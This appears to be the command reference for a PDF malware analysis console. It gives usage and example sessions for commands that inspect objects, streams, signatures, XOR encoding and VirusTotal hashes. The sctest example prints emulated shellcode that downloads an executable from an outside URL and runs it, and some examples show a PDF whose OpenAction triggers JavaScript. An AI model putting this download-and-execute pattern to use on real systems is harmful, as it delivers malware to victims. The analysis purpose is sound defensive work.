│ Object │ Application │ DocumentID                                   │ OriginalDocumentID                           │ LastModified      │
├────────┼─────────────┼──────────────────────────────────────────────┼──────────────────────────────────────────────┼───────────────────┤
│ 90795  │ InDesign    │ xmp.did:780a6ade-dc79-4c31-a54a-260fb5bea548 │ xmp.did:147e8572-2a0f-4e8b-bfd4-f58153c4d884 │ D:20230323075532Z │
└────────┴─────────────┴──────────────────────────────────────────────┴──────────────────────────────────────────────┴───────────────────┘
```
## quit

```
Usage: quit

Exits from the console
```
## rawobject

```
Usage: rawobject [object_id|xref|trailer [version]]

Show the content of the object without being decoded or decrypted (object_id, xref, trailer)

PPDF> rawobject xref

xref
0 15
0000000000 65535 f
0000000015 00000 n
0000000261 00000 n
0000000279 00000 n
0000000324 00000 n
0000000397 00000 n
0000000428 00000 n
0000000448 00000 n
0000000487 00000 n
0000000553 00000 n
0000000731 00000 n
0000000781 00000 n
0000000862 00000 n
0000000909 00000 n
0000004186 00000 n

PPDF> rawobject trailer

trailer
<< /Size 48
/Root 7 0 R
/Info 5 0 R
/ID [ <548a101919e16b5fda932e72fac462b6> <e5e7d3fab3c2c0408f96f355fa6783eb> ]
/Prev 78850
 >>
startxref
84397
%%EOF
```
## rawstream

```
Usage: rawstream object_id [version]

Shows the stream content of the specified document version before being decoded and decrypted

The bytes shown are exactly the stream data: the end-of-line marker before "endstream" is not part of the stream, so their number matches the /Length of the stream and their hash matches the one other tools calculate for it.

PPDF> rawstream 1

78 9c 45 8e c1 0a 83 30 10 44 ef f9 8a f9 83 4d |x.E....0.D.....M|
5a 15 0b 22 b4 de 2c a5 a2 bd 15 0f c1 06 09 14 |Z.."..,.........|
23 1a 4b fb f7 5d 6b a0 2c 7b d8 61 e6 ed 28 48 |#.K..]k.,{.a..(H|
ec 10 2b ec 71 88 10 41 25 29 b2 0c 74 fb 8c 06 |..+.q..A%)..t...|
54 68 af 9f ae 17 54 e9 de cc 6c 94 a8 05 5d 47 |Th....T...l...]G|
33 1c 3b 6f dd c0 01 56 90 e7 6b e4 6c 1f 33 ee |3.;o...V..k.l.3.|
0c 5a a5 56 04 c4 2f 29 a8 70 cb e0 a1 82 b5 d2 |.Z.V../).p......|
93 e1 33 f0 fe 46 41 b5 99 dd 32 75 fc 8c 7d 79 |..3..FA...2u..}y|
2e e8 62 1e 56 9f dc 9b c9 92 27 91 12 29 6f 1b |..b.V.....'..)o.|
48 5b 76 6b 23 a8 01 95 fa a5 9b 6e b2 a3 17 54 |H[vk#......n...T|
36 88 43 c1 2f a0 0d 3e 09 0a                   |6.C./..>..      |

PPDF> stream 1

1 0 2 51 3 94 4 168
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
<< /Kids [ 3 0 R ] /Type /Pages /Count 1 >>
<< /Parent 2 0 R /Type /Page /Resources << >> /MediaBox [ 0 0 600 800 ] >>
<< /Type /Action /S /JavaScript /JS 5 0 R >>
```
## references

```
Usage: references to|in object_id [version]

Shows the references in the object or to the object in the specified version of the document

PPDF> references in 2

['3 0 R']

PPDF> object 2

<< /Kids [ 3 0 R ] /Type /Pages /Count 1 >>

PPDF> references to 2

[1, 3]

PPDF> object 3

<< /Parent 2 0 R /Type /Page /Resources << >> /MediaBox [ 0 0 600 800 ] >>
```
## replace

```
Usage: replace all $string1 $string2
Replaces $string1 with $string2 in the whole PDF file 

Usage: replace variable $var_name $string1 $string2
Replaces $string1 with $string2 in the content of the specified variable

Usage: replace file $file_name $string1 $string2
Replaces $string1 with $string2 in the content of the specified file 

PPDF> object 2

<< /Kids [ 3 0 R ] /Type /Pages /Count 1 >>

PPDF> object 3

<< /Parent 2 0 R /Type /Page /Resources << >> /MediaBox [ 0 0 600 800 ] >>

PPDF> replace all Page OtherWord

The string has been replaced correctly

PPDF> object 2

<< /Kids [ 3 0 R ] /Type /OtherWords /Count 1 >>

PPDF> object 3

<< /Parent 2 0 R /Type /OtherWord /Resources << >> /MediaBox [ 0 0 600 800 ] >> 

PPDF> set myvar "Hello World"

PPDF> replace variable myvar Hello Bye

The string has been replaced correctly

PPDF> show myvar

Bye World
```
## reset

```
Usage: reset
Cleans the console

Usage: reset var_name
Resets the variable value to the default value if applicable It's specially useful when we change the standard ouput of the console to a file or variable to restore it to the normal output. See the [set] command.

PPDF> reset output

output = "stdout"
```
## save

```
Usage: save [filename]

Saves the file to disk
```
It's recommended to use this command when we make modifications in the document to keep it free of conflicts. For example, if we don't save the changes we can have inconsistent results when we use "object" and "rawobject" commands, because one of them is related to the file before the modifications and the other one after them.

If the file can't be saved, the reason is shown after the message.


## save_version

```
Usage: save_version $version $file_name
Saves the selected file version to disk
```
## sctest

```
Usage: sctest [-v] variable var_name
Usage: sctest [-v] file file_name
Usage: sctest [-v] raw offset num_bytes

Wrapper of the sctest tool (libemu) to emulate shellcodes. -v = verbose, there may be a lot of data

PPDF> sctest file /tmp/shellcode

verbose = 0 Hook me Captain Cook! userhooks.c:127 user_hook_ExitThread ExitThread(32) stepcount 9172 FARPROC WINAPI GetProcAddress ( HMODULE hModule = 0x7c800000 => none; LPCSTR lpProcName = 0x0041767d => = "GetSystemDirectoryA"; ) = 0x7c814eea; FARPROC WINAPI GetProcAddress ( HMODULE hModule = 0x7c800000 => none; LPCSTR lpProcName = 0x00417691 => = "WinExec"; ) = 0x7c86136d; FARPROC WINAPI GetProcAddress ( HMODULE hModule = 0x7c800000 => none; LPCSTR lpProcName = 0x00417699 => = "ExitThread"; ) = 0x7c80c058; FARPROC WINAPI GetProcAddress ( HMODULE hModule = 0x7c800000 => none; LPCSTR lpProcName = 0x004176a4 => = "LoadLibraryA"; ) = 0x7c801d77; HMODULE LoadLibraryA ( LPCTSTR lpFileName = 0x004176b1 => = "urlmon"; ) = 0x7df20000; FARPROC WINAPI GetProcAddress ( HMODULE hModule = 0x7df20000 => none; LPCSTR lpProcName = 0x004176b8 => = "URLDownloadToFileA"; ) = 0x7df7b0bb; UINT GetSystemDirectory ( LPTSTR lpBuffer = 0x0012fe7c => none; UINT uSize = 32; ) = 19; HRESULT URLDownloadToFile ( LPUNKNOWN pCaller = 0x00000000 => none; LPCTSTR szURL = 0x004176cb => = "http://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe"; LPCTSTR szFileName = 0x0012fe7c => = "c:\WINDOWS\system32\a.exe"; DWORD dwReserved = 0; LPBINDSTATUSCALLBACK lpfnCB = 0; ) = 0; UINT WINAPI WinExec ( LPCSTR lpCmdLine = 0x0012fe7c => = "c:\WINDOWS\system32\a.exe"; UINT uCmdShow = 0; ) = 32; void ExitThread ( DWORD dwExitCode = 32; ) = 0;

```
## search

```
Usage: search [glyph] [hex] string

Search the specified string or hexadecimal string in the objects (decoded and encrypted streams included)

glyph: also search page text shown through custom-encoded fonts (glyph codes decoded via /ToUnicode or /Differences plus the Adobe Glyph List, best-effort, it does not account for all fonts)

Example: search hex \x34\x35

Example: search glyph interesting_text

PPDF> search javascript

[4]

PPDF> search hex \x4a\x61\x76\x61

[4]

PPDF> search glyph pdf

Version 0: [3]
```
## set

```
Usage: set [$var_name $var_value]
Sets the specified variable value or creates one with this value. Without parameters all the variables are shown. 


Special variables: 


	header_file:		READ ONLY. Specifies the file header to be used when "malformed_options" are active.
	malformed_options:	READ ONLY. Variable to store the malformed options used to save the file.
	output:				Specifies where the output of a command will go. Options are "stdout", "file", and "variable". Default is "stdout".
	output_limit:		variable to specify the maximum number of lines to be shown at once when the output is long (no limit = 0). By default the limit is 500 lines.
	vt_key:				VirusTotal API key. 
  
The "set output" way to store the commands output has been deprecated, use instead ">" and ">>" for files, and "$>" and "$>>" for variables:

PPDF> rawstream 5

78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b |x...{.j`....r.^<|
5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54 |Z&".7b.......%.T|
a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50 |...w..<...?...GP|
69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8 |ii..4k;.....k...|
b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23 |...^XH|.......N#|
40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f |@*h^C..{..5..*+?|
41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34 |A.d.......Q.9..4|
2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b |*..A._.Y.;..J59.|
db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e |.0d>..l!...+1..n|
21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93 |!.....W.T.&a....|
67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68 |gh...y.........h|
b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5 |..\...8?....`.6.|
d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a |....au.+....Z..:|
7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d |.....8..).nr.s.m|
2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44 |......H..?.d...D|
92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56 |...P.V.K.o.g.C.V|
7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b |}.X..p..;%.)...{|
-- snip --

PPDF> rawstream 5 $> stream5

78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b |x...{.j`....r.^<|
5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54 |Z&".7b.......%.T|
a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50 |...w..<...?...GP|
69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8 |ii..4k;.....k...|
b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23 |...^XH|.......N#|
40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f |@*h^C..{..5..*+?|
41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34 |A.d.......Q.9..4|
2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b |*..A._.Y.;..J59.|
db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e |.0d>..l!...+1..n|
21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93 |!.....W.T.&a....|
67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68 |gh...y.........h|
b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5 |..\...8?....`.6.|
d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a |....au.+....Z..:|
7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d |.....8..).nr.s.m|
2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44 |......H..?.d...D|
92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56 |...P.V.K.o.g.C.V|
7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b |}.X..p..;%.)...{|
-- snip --

PPDF> show stream5

78 da 05 c1 7b 7f 6a 60 00 00 e0 cf 72 dc 5e 8b |x...{.j`....r.^<|
5a 26 22 8a 37 62 ea 87 cd ad 8b cb ab 25 e4 54 |Z&".7b.......%.T|
a7 da fa 77 9f fd 3c cf 92 bd 3f 18 bd 89 47 50 |...w..<...?...GP|
69 69 d2 81 34 6b 3b f5 c2 17 cc d3 6b bb 90 f8 |ii..4k;.....k...|
b7 b0 f5 5e 58 48 7c 7f 84 1a 1c b8 ed f9 4e 23 |...^XH|.......N#|
40 2a 68 5e 43 af eb 7b 8e f2 35 cb f0 2a 2b 3f |@*h^C..{..5..*+?|
41 95 64 b0 a9 af d8 a1 f0 af 51 eb 39 e3 b7 34 |A.d.......Q.9..4|
2a 84 9d 41 1c 5f ad 59 82 3b fd e9 4a 35 39 9b |*..A._.Y.;..J59.|
db 30 64 3e 92 d4 6c 21 98 e4 0b 2b 31 e7 e8 6e |.0d>..l!...+1..n|
21 89 2e f6 d4 96 57 b4 54 1e 26 61 b7 b6 16 93 |!.....W.T.&a....|
67 68 b8 be 8b 79 f1 fe 82 ee eb e2 99 92 f7 68 |gh...y.........h|
b0 b4 5c 14 10 dc 38 3f dc f8 d0 ac 60 ff 36 a5 |..\...8?....`.6.|
d6 d8 e3 b2 61 75 0c 2b 1f a6 b6 17 5a cd ea 3a |....au.+....Z..:|
7f ff a3 11 b6 38 e0 29 5c e0 6e 72 a9 73 1b 6d |.....8..).nr.s.m|
2e c7 9c 92 83 a3 48 96 bb 3f cc 64 85 af a8 44 |......H..?.d...D|
92 ed a6 50 e9 56 fa 4b f5 6f e2 67 e0 43 e6 56 |...P.V.K.o.g.C.V|
7d d8 58 10 a9 70 a8 e0 3b 25 d1 29 e3 ab 2a 7b |}.X..p..;%.)...{|
-- snip --

Long output is shown in pages of "output_limit" lines in the interactive console. Press <enter> to see the next page or "q" to stop. To show everything at once, use 0:

PPDF> set output_limit 0
```
## show

```
Usage: show var_name

Shows the value of the specified variable

Special variables:

header_file
malformed_options
output
output_limit
vt_key

PPDF> set myHelloVar "Hello World!!"

PPDF> show myHelloVar

Hello World!!
```
## signatures

```
Usage: signatures [verbose]

Verifies embedded digital signatures: content integrity (was the signed byte range altered since signing) and signature authenticity (does it verify against the embedded signer certificate). Does not check certificate chain-of-trust or revocation.

verbose: show full per-signature detail instead of a summary table

PPDF> signatures

┌────────────┬─────────┬──────────────────────┬───────────┬──────────────┬──────────────────────────────────────────────────────────────────────────────────────┐
│ Field      │ Version │ SubFilter            │ Integrity │ Authenticity │ Signer                                                                               │
├────────────┼─────────┼──────────────────────┼───────────┼──────────────┼──────────────────────────────────────────────────────────────────────────────────────┤
│ Signature1 │ 0       │ /adbe.pkcs7.detached │ valid     │ valid        │ Email Address: fred.flintstone@bedrock.com, Common Name: fred.flintstone@bedrock.com │
└────────────┴─────────┴──────────────────────┴───────────┴──────────────┴──────────────────────────────────────────────────────────────────────────────────────┘

PPDF> signatures verbose

Field: Signature1 (object 10, version 0)
  Filter: /Adobe.PPKLite  SubFilter: /adbe.pkcs7.detached
  ByteRange: [0, 32976, 40532, 487]
  Modified after signing: False
  Content integrity: valid
  Signature authenticity: valid
  Signing time: 2016-09-01T15:51:37+00:00
  Digest / signature algorithm: sha1 / rsassa_pkcs1v15
  Signer subject: Email Address: fred.flintstone@bedrock.com, Common Name: fred.flintstone@bedrock.com
  Signer issuer: Common Name: GlobalSign PersonalSign 1 CA - SHA256 - G2, Organization: GlobalSign nv-sa, Country: BE
  Certificate version: 3
  Serial number: 66B455C317BDB0EBB5DD59C465EC2D28
  Certificate validity: 2014-11-13T13:41:30+00:00 - 2017-11-13T13:41:30+00:00
  Public key: RSA (2048 bits)
  Certificate signature algorithm: SHA256withRSA
  MD5 fingerprint: 46:D6:07:D8:B0:06:D0:E7:D3:D4:76:D0:80:F2:49:65
  SHA-1 fingerprint: F2:4D:D3:DF:F5:87:C5:79:9C:B6:93:7B:A3:40:BB:17:47:F2:F8:16
  SHA-256 fingerprint: C8:43:AB:65:00:1F:5E:67:B3:41:CE:3A:33:38:53:4A:89:4F:AC:10:01:F4:A1:9F:C2:8E:F3:D5:D1:62:EC:F1
  Self-signed: False
  Signing time within certificate validity: True
  Note: SHA1 is a weak digest algorithm
  Embedded certificate chain, leaf to root (3; not validated):
    1. Email Address: fred.flintstone@bedrock.com, Common Name: fred.flintstone@bedrock.com [signer]
       Issuer: Common Name: GlobalSign PersonalSign 1 CA - SHA256 - G2, Organization: GlobalSign nv-sa, Country: BE
       Serial: 66B455C317BDB0EBB5DD59C465EC2D28  Valid: 2014-11-13T13:41:30+00:00 - 2017-11-13T13:41:30+00:00
       SHA-1: F2:4D:D3:DF:F5:87:C5:79:9C:B6:93:7B:A3:40:BB:17:47:F2:F8:16
-- snip --
```
Signatures using /adbe.pkcs7.detached, /adbe.pkcs7.sha1, /ETSI.CAdES.detached and /adbe.x509.rsa_sha1 are verified, and so are the permissions signatures found under /Perms (/DocMDP, /UR3, /UR). Signatures are searched in every version of the document, and the "Version" column shows the one where each was found. A document timestamp (/DocTimeStamp, /ETSI.RFC3161) is listed but reported as unsupported at this time (sampling required for validation).
## stream

```
Usage: stream object_id [version]

Shows the object stream content of the specified version after being decoded and decrypted (if necessary)

PPDF> rawstream 1

78 9c 45 8e c1 0a 83 30 10 44 ef f9 8a f9 83 4d |x.E....0.D.....M|
5a 15 0b 22 b4 de 2c a5 a2 bd 15 0f c1 06 09 14 |Z.."..,.........|
23 1a 4b fb f7 5d 6b a0 2c 7b d8 61 e6 ed 28 48 |#.K..]k.,{.a..(H|
ec 10 2b ec 71 88 10 41 25 29 b2 0c 74 fb 8c 06 |..+.q..A%)..t...|
54 68 af 9f ae 17 54 e9 de cc 6c 94 a8 05 5d 47 |Th....T...l...]G|
33 1c 3b 6f dd c0 01 56 90 e7 6b e4 6c 1f 33 ee |3.;o...V..k.l.3.|
0c 5a a5 56 04 c4 2f 29 a8 70 cb e0 a1 82 b5 d2 |.Z.V../).p......|
93 e1 33 f0 fe 46 41 b5 99 dd 32 75 fc 8c 7d 79 |..3..FA...2u..}y|
2e e8 62 1e 56 9f dc 9b c9 92 27 91 12 29 6f 1b |..b.V.....'..)o.|
48 5b 76 6b 23 a8 01 95 fa a5 9b 6e b2 a3 17 54 |H[vk#......n...T|
36 88 43 c1 2f a0 0d 3e 09 0a                   |6.C./..>..      |

PPDF> stream 1

1 0 2 51 3 94 4 168
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
<< /Kids [ 3 0 R ] /Type /Pages /Count 1 >>
<< /Parent 2 0 R /Type /Page /Resources << >> /MediaBox [ 0 0 600 800 ] >>
<< /Type /Action /S /JavaScript /JS 5 0 R >>
```
## streams
```
Usage: streams [version]

Shows all available streams or streams by version

PPDF> streams

Version 0: Streams (12): [12, 13, 14, 15, 16, 17, 21, 22, 23, 24, 43, 42]
Version 1: Streams (2): [45, 47]

PPDF> streams 1

Version 1: Streams (2): [45, 47]

```
## tree

```
Usage: tree [num_version]

Shows the tree graph of the file or specified version It's useful to see all the dependencies between objects in a visual way, the output is the logical structure of the document.

PPDF> tree

/Producer (17) 
dictionary (2) 
/Pages (18) 
	/Page (6) 
		stream (9) 
			stream (1) 
			Unknown (0) 
		/Pages (18) 
		/ExtGState (19) 
		/ExtGState (20) 
		/Font (21) 
			/Font (22) 
				/FontDescriptor (23) 
					stream (10) 
			stream (11) 
		/Font (24) 
			/Font (25) 
				/FontDescriptor (26) 
					stream (12) 
			stream (13) 
		/Font (27) 
			/Font (28) 
				/FontDescriptor (29) 
					stream (14) 
			stream (15) 
		stream (7) 
			stream (8) 
stream (3) 
	/Catalog (4) 
		/Pages (18) 
	/Producer (17) 
stream (5) 
stream (16) 
	/FontDescriptor (26) 
	stream (13) 
	/FontDescriptor (29) 
	stream (10) 
	/Font (25) 
	/Font (28) 
	stream (14) 
	/Page (6) 
	/FontDescriptor (23) 
	stream (11) 
	stream (12) 
	stream (15) 
	/Font (22)
```
## vtcheck

```
Usage: vtcheck
Usage: vtcheck object|rawobject|stream|rawstream $object_id [$version]
Usage: vtcheck raw $offset $num_bytes
Usage: vtcheck file $file_name
Usage: vtcheck variable $var_name

Checks the hash of the specified source on VirusTotal: raw bytes of the file, objects and streams, and the content of files or variables. If no parameters are specified then the hash of the PDF document will be checked.

* NOTE: NO CONTENT IS SENT TO VIRUSTOTAL, JUST HASHES!!

* NOTE: You need a VirusTotal API key to use this command. With this command you can check the hash of the PDF file on [VirusTotal](https://www.virustotal.com). But not only the PDF file itself but also the hash of any object, rawobject, stream, rawstream, raw bytes, files or variable. It is important to say that no content is sent to VirusTotal, just the hashes. Also, you will need a VirusTotal API key to use this command.

PPDF> set vt_key <YOUR_API_KEY>
PPDF> vtcheck

Detection rate: 32/64
Last analysis date: 20251208-015105
Report link: https://www.virustotal.com/gui/file/e4280fd86313a5830acc651f58d118037500087deb6da63338d73adb1fddda9d
Names: rce_foxit.pdf, RCE Foxit.pdf
Scan results: 

┌──────────────────────┬─────────────────────────┬───────────────┬─────────────────────────────────────────────────────┐
│ Engine               │ Engine Version          │ Engine Update │ Result                                              │
├──────────────────────┼─────────────────────────┼───────────────┼─────────────────────────────────────────────────────┤
│ ALYac                │ 2.0.0.10                │ 20251207      │ Trojan.Generic.38360229                             │
│ AVG                  │ 23.9.8494.0             │ 20251207      │ JS:CVE-2018-9948-A [Expl]                           │
│ Arcabit              │ 2025.0.0.23             │ 20251208      │ Trojan.Generic.D24954A5                             │
│ Avast                │ 23.9.8494.0             │ 20251207      │ JS:CVE-2018-9948-A [Expl]                           │
│ Avira                │ 8.3.3.24                │ 20251208      │ JS/CVE-2018-9948.G                                  │
-- snip --
│ ZoneAlarm            │ 6.21-110947004          │ 20251208      │ Exp/MSFFFmnt-A                                      │
│ alibabacloud         │ 2.2.0                   │ 20250321      │ Exploit:Javascript/CVE-2018-9948.A                  │
└──────────────────────┴─────────────────────────┴───────────────┴─────────────────────────────────────────────────────┘
```
## xml

```
Usage: xml

Shows the info for the currently loaded file in XML format
```
## xor

```
Usage: xor stream|rawstream $object_id [$version] [$key]
Usage: xor raw $offset $num_bytes $key
Usage: xor file $file_name $key
Usage: xor variable $var_name $key

Performs an XOR operation using the specified key with the content of the specified file or variable, raw bytes of the file or stream/rawstream. If the key is not specified then a bruteforcing XOR is performed.

PPDF> xor file test_file 0x12

Z{>2fz{a2{a2s2fwaf2t{~w3

PPDF> xor stream 7 0xfa

d2 bb 9b 9b 9b 9b d3 da ae 90             |..........      |

If the key is not specified then a bruteforcing XOR is performed:

PPDF> xor stream 7

[0x0]
(Aaaaa) Tj
[/0x0]
[0x1]
)@````(!Uk 
[/0x1]
[0x2]
Ccccc+"Vh
[/0x2]
[0x3]
+Bbbbb#Wi
[/0x3]
[0x4]
,Eeeee-$Pn
[/0x4]
[0x5]
-Ddddd,%Qo
[/0x5] ...

PPDF> xor raw 100 50 0x16

&6yt|**9Zsxqb~6%'$69Pzbsd69PzwbsRsuyrs6((ebdsw{
```
## xor_search

```
Usage: xor_search [-i] stream|rawstream $object_id [$version] $string_to_search
Usage: xor_search [-i] raw $offset $num_bytes $string_to_search
Usage: xor_search [-i] file $file_name $string_to_search
Usage: xor_search [-i] variable $var_name $string_to_search

Searches for the specified string in the result of an XOR brute forcing operation with the content of the specified file or variable, 
raw bytes of the file or stream/rawstream. The output shows the offset(s) where the string is found.
The search is case sensitive, use -i to make it case insensitive.

PPDF> xor_search stream 2 "template"

Pattern found with the following keys: ['0x0']

Offsets for key '0x0': [407, 466, 607, 624, 684, 825, 843, 903, 1044]

PPDF> xor file test_file 0x63 > xored_test

PPDF> xor_search file xored_test "file"

Pattern found with the following keys: ['0x63']

Offsets for key '0x63': [19]

PPDF> xor_search -i file xored_test "file"

Pattern found with the following keys: ['0x43', '0x63']

Offsets for key '0x43': [19] Offsets for key '0x63': [19]

PPDF> xor file xored_test 0x43

hI THISISATESTFILE*

PPDF> xor file xored_test 0x63

Hi, this is a test file!

```
## xref

```
Usage: xref [version]

Shows the cross reference table (classic and/or stream) of the document or the specified version: each object's id, generation number, type ("n" in use, "f" free, "c" compressed inside an object stream), and its offset, next-free link, or ObjStm location accordingly.

PPDF> xref

Version 0:

  xref table (offset 32280):
┌────────┬───────┬──────┬──────────────┐
│ Object │ Gen   │ Type │ Details      │
├────────┼───────┼──────┼──────────────┤
│ 0      │ 65535 │ f    │ next free 10 │
│ 1      │ 0     │ n    │ offset 17    │
│ 2      │ 0     │ n    │ offset 166   │
│ 3      │ 0     │ n    │ offset 222   │
-- snip --
│ 29     │ 0     │ n    │ offset 31928 │
│ 30     │ 0     │ n    │ offset 31973 │
└────────┴───────┴──────┴──────────────┘

  Xref stream (in object 30):
┌────────┬───────┬──────┬──────────────────────────┐
│ Object │ Gen   │ Type │ Details                  │
├────────┼───────┼──────┼──────────────────────────┤
│ 0      │ 65535 │ f    │ next free 0              │
│ 1      │ 0     │ n    │ offset 17                │
-- snip --
│ 9      │ 0     │ n    │ offset 1453              │
│ 10     │ -     │ c    │ in ObjStm 21 at index 10 │
│ 11     │ -     │ c    │ in ObjStm 21 at index 11 │
│ 12     │ -     │ c    │ in ObjStm 21 at index 12 │
-- snip --
```
